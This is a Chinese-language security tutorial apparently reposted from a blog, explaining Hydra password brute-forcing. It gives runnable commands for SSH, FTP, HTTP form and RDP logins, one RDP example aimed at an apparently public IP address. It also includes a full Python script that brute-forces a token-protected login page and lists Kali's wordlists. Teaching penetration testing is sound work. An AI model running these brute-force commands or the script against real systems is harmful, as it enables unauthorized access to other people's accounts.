> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247484170&idx=1&sn=bae954cb643b5517057fb8ed08bede6a&chksm=eaad8337ddda0a21b093d4d5682ddc097388ec6f22092687557a9b99d8027bbd11a530383c86&scene=21#wechat_redirect)

**目录**

  

    Hydra

    常见参数

    破解 SSH

    破解 FTP

    破解 HTTP

    破解 3389 远程登录

    Kali 自带密码字典

    dirb

    dirbuster

    fern-wifi

    metasploit

    wfuzz

Hydra 是一款非常强大的暴力破解工具，它是由著名的黑客组织 THC 开发的一款开源暴力破解工具。Hydra 是一个验证性质的工具，主要目的是：展示安全研究人员从远程获取一个系统认证权限。

目前该工具支持以下协议的爆破：  
AFP，Cisco AAA，Cisco 身份验证，Cisco 启用，CVS，Firebird，FTP，HTTP-FORM-GET，HTTP-FORM-POST，HTTP-GET，HTTP-HEAD，HTTP-PROXY，HTTPS-FORM- GET，HTTPS-FORM-POST，HTTPS-GET，HTTPS-HEAD，HTTP-Proxy，ICQ，IMAP，IRC，LDAP，MS-SQL，MYSQL，NCP，NNTP，Oracle Listener，Oracle SID，Oracle，PC-Anywhere， PCNFS，POP3，POSTGRES，RDP，Rexec，Rlogin，Rsh，SAP / R3，SIP，SMB，SMTP，SMTP 枚举，SNMP，SOCKS5，SSH（v1 和 v2），Subversion，Teamspeak（TS2），Telnet，VMware-Auth ，VNC 和 XMPP。

对于 HTTP，POP3，IMAP 和 SMTP，支持几种登录机制，如普通和 MD5 摘要等。

由于 Kali 中自带 Hydra，所以怎么安装就不讲了，下面直接讲如何用它。

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC5x6JawVlxYwrsf4OxhIz1HzZrTT4UZAcukC3cKqetSHpGJABL8ZCM8yibLyNpvY2Zia3IAY3P6yE9A/640?wx_fmt=gif)

常见参数

· **-R：**继续从上一次进度接着破解

· **-S：**大写，采用 SSL 链接

· **-s  <PORT>：**小写，可通过这个参数指定非默认端口

· **-l  <LOGIN>：**指定破解的用户，对特定用户破解

· **-L  <FILE>：**指定用户名字典

· **-p  <PASS>：**小写，指定密码破解，少用，一般是采用密码字典

· **-P  <FILE>：**大写，指定密码字典

· **-e  <ns>：**可选选项，n：空密码试探，s：使用指定用户和密码试探

· **-C  <FILE>：**使用冒号分割格式，例如 “登录名: 密码” 来代替 -L/-P 参数

· **-M  <FILE>：**指定目标列表文件一行一条

· **-o  <FILE>：**指定结果输出文件

· **-f ：**在使用 - M 参数以后，找到第一对登录名或者密码的时候中止破解

· **-t <TASKS>：**同时运行的线程数，默认为 16

· **-w <TIME>：**设置最大超时的时间，单位秒，默认是 30s

· **-v / -V：**显示详细过程

· **server：**目标 ip

· **service：**指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp 等等

· **OPT：**可选项

**破解 SSH**

hydra -L user.txt -P passwd.txt -o ssh.txt -vV -t 5 10.96.10.252 ssh   _#-L 指定用户字典 -P 指定密码字典  -o 把成功的输出到 ssh.txt 文件 -vV 显示详细信息_

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dBUoKpVDZeDHDHqxibdWz29pCibVKejNTaujDoD4AxMeicahuicAa6GqmXm3GsLuaHqiaLZesDy4AnS1g/640?wx_fmt=png)

**破解 FTP**

hydra -L user.txt -P passwd.txt -o ftp.txt -t 5 -vV 10.96.10.208 ftp _#-L 指定用户名列表 -P 指定密码字典 -o 把爆破的输出到文件 -t 指定线程 -vV 显示详细信息_

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dBUoKpVDZeDHDHqxibdWz29eDXicaal2m66phJPb3PdTylXJ9oAH378vjNITYpUAhUUkythDGibYEibQ/640?wx_fmt=png)

**破解 HTTP**  

我们拿 DVWA 测试破解 HTTP，破解 HTTP，需要分析数据包的提交格式

**GET 方式：**

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dBUoKpVDZeDHDHqxibdWz29ZHVAJcF8tnAz2JC3w0hicKL5VoCKraSJob8iakR0Mja5hLmzc5NSsRcA/640?wx_fmt=png)

分析数据包，我们得到下面的命令  

hydra -L user.txt -P passwd.txt -o http_get.txt -vV 10.96.10.208 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect:H=Cookie: PHPSESSID=nvvrgk2f84qhnh43cm28pt42n6; security=low" -t 3

#前面那些参数就不说了，主要说一下引号里面的数据 /vulnerabilities/brute/ 代表请求目录，用：分隔参数，^USER^ 和 ^PASS^ 代表是攻击载荷，F= 后面是代表密码错误时的关键字符串 ，H 后面是 cookie 信息

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dBUoKpVDZeDHDHqxibdWz29uR3Tv66KBcyxfwv4zGXfJrnr53CicfChFlBApBWc0uZibnH6mh2NSAmw/640?wx_fmt=png)

**POST 方式：** 

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dBUoKpVDZeDHDHqxibdWz29xuCibeTOXU1V7hQw2ScJu2TOFgQurf7qMA2gH8rAd9LDyibdFbT2xycA/640?wx_fmt=png)

分析数据包，得到下面的破解命令  

hydra -L user.txt -P passwd.txt -t 3 -o http_post.txt -vV 10.96.10.183 http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login&user_token=dd6bbcc4f4672afe99f15b1d2c249ea5:S=index.php"

#前面那些参数就不说了，主要说一下引号里面的数据 /login.php 代表请求目录，用：分隔参数，^USER^ 和 ^PASS^ 代表是攻击载荷，S 等于的是密码正确时返回应用的关键字符串

但是新版的 DVWA 采用了 token 的验证方式，每次登录的 token 都是不一样的，所以不能用 hydra 来破解。目前，大多数网站登录都采用了 token 验证，所以，都不能使用 Hydra 来破解。

我们可以自己写一个 python 脚本来破解。 

```
# -*- coding: utf-8 -*-
"""
Created on Sat Nov 24 20:42:01 2018
@author: 小谢
"""
import urllib
import requests
from bs4 import BeautifulSoup
##第一步，先访问 http://127.0.0.1/login.php页面，获得服务器返回的cookie和token
def get_cookie_token():
    headers={'Host':'127.0.0.1',
             'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
             'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Lanuage':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
             'Connection':'keep-alive',
             'Upgrade-Insecure-Requests':'1'}
    res=requests.get("http://127.0.0.1/login.php",headers=headers)
    cookies=res.cookies
    a=[(';'.join(['='.join(item)for item in cookies.items()]))]   ## a为列表，存储cookie和token
    html=res.text
    soup=BeautifulSoup(html,"html.parser")
    token=soup.form.contents[3]['value']
    a.append(token)
    return a

##第二步模拟登陆

def Login(a,username,password):    #a是包含了cookie和token的列表
    headers={'Host':'127.0.0.1',
             'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
             'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Lanuage':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
             'Connection':'keep-alive',
             'Content-Length':'88',
             'Content-Type':'application/x-www-form-urlencoded',
             'Upgrade-Insecure-Requests':'1',
             'Cookie':a[0],
             'Referer':'http://127.0.0.1/login.php'}
    values={'username':username,
            'password':password,
            'Login':'Login',
            'user_token':a[1]
        }
    data=urllib.parse.urlencode(values)
    resp=requests.post("http://127.0.0.1/login.php",data=data,headers=headers)
    return 
#重定向到index.php
def main():
    with open("user.txt",'r') as f:
        users=f.readlines()
        for user in users:
            user=user.strip("\n")                 #用户名
            with open("passwd.txt",'r') as file:
                passwds=file.readlines()
                for passwd in passwds:
                    passwd=passwd.strip("\n")   #密码
                    a=get_cookie_token()              ##a列表中存储了服务器返回的cookie和toke
                    Login(a,user,passwd)
                    headers={'Host':'127.0.0.1',
                              'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
                              'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                              'Accept-Lanuage':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
                              'Connection':'keep-alive',
                              'Upgrade-Insecure-Requests':'1',
                              'Cookie':a[0],
                              'Referer':'http://127.0.0.1/login.php'}
                    response=requests.get("http://127.0.0.1/index.php",headers=headers)
                    if response.headers['Content-Length']=='7524':    #如果登录成功
                       print("用户名为：%s ,密码为：%s"%(user,passwd))   #打印出用户名和密码
                       break
if __name__=='__main__':
    main()
```

脚本运行截图

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dBUoKpVDZeDHDHqxibdWz292edACt9Uu8XEibM0ic95bYxBrt7RmowUQL3A4ObibpJb3GaJEibvQwChog/640?wx_fmt=png)

**破解 3389 远程登录**  

hydra 202.207.236.4 rdp -L user.txt -P passwd.txt -V

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dBUoKpVDZeDHDHqxibdWz2900PoheEBPIgaJr8lprKM1yxc3cbbaib0tJ3VEQtK3gqtUcnmv0yEJhA/640?wx_fmt=png)

  

  

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC5x6JawVlxYwrsf4OxhIz1HoaHEjBLqmAGrZlH8BTIAaGKt4xLxqt7gEL9Jj00Y7u9ic8Xy6EYiaVBQ/640?wx_fmt=gif)

Kali 自带密码字典

暴力破解能成功最重要的条件还是要有一个强大的密码字典！Kali 默认自带了一些字典，在 /usr/share/wordlists 目录下

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dBUoKpVDZeDHDHqxibdWz29RKOtibWeibJcaMMO3yxPibAI4zf12YKnJhnXdngPWzQlDlibFtJ7v9zia2A/640?wx_fmt=png)

**dirb**

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dBUoKpVDZeDHDHqxibdWz29SiaC7eg7W4IapLVWlTpKxNdXs02CHPoznWOuLQtAWAP0VEsO43Qw5vg/640?wx_fmt=png)

big.txt #大的字典

small.txt #小的字典

catala.txt #项目配置字典

common.txt #公共字典

euskera.txt #数据目录字典

extensions_common.txt #常用文件扩展名字典

indexes.txt #首页字典

mutations_common.txt #备份扩展名

spanish.txt #方法名或库目录

others #扩展目录，默认用户名等

stress #压力测试

vulns #漏洞测试

**dirbuster**

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dBUoKpVDZeDHDHqxibdWz29ZeiauqOwRYFoMXvS0GwvWcQ4cInH1kjyjE8lZcDpjnEWWVzDj9cXa3w/640?wx_fmt=png)

apache-user-enum-** #apache 用户枚举

directories.jbrofuzz # 目录枚举

directory-list-1.0.txt # 目录列表大，中，小 big，medium，small

**fern-wifi**

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dBUoKpVDZeDHDHqxibdWz293d7wYwC3Cs0h5d23tEwLu2hBBOMCked6zclfYCKiaPRbbLByu4tJSXQ/640?wx_fmt=png)

common.txt _#公共 wifi 账户密码_

**metasploit**

metasploit 下有各种类型的字典

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dBUoKpVDZeDHDHqxibdWz29cY3uNzdBGtTiaicOpmXEFQ82KJqE2LyzsH2qavaCquzsicwb9M6Zbu4ibw/640?wx_fmt=png)

**wfuzz**

模糊测试，各种字典

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dBUoKpVDZeDHDHqxibdWz29y23FibOBLdfklnBNfVUOgWAVzFrplzIhT5659ibPibPr3ibDuz2rnwNUQQ/640?wx_fmt=png)

  

  

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2ckkbwTsBvnDJpb89o8WMxvAKOaVnz60hOe7y3wAHiclddyK53lpEKIQlx4DKOq6EojHibVicgibDB2aQ/640?wx_fmt=gif)

来源：谢公子的博客

责编：浮夸

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2edCjiaG0xjojnN3pdR8wTrKhibQ3xVUhjlJEVqibQStgROJqic7fBuw2cJ2CQ3Muw9DTQqkgthIjZf7Q/640?wx_fmt=png)

由于文章篇幅较长，请大家耐心。如果文中有错误的地方，欢迎指出。有想转载的，可以留言我加白名单。

最后，欢迎加入谢公子的小黑屋（安全交流群）(QQ 群：783820465)

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SjCxEtGic0gSRL5ibeQyZWEGNKLmnd6Um2Vua5GK4DaxsSq08ZuH4Avew/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640?wx_fmt=png)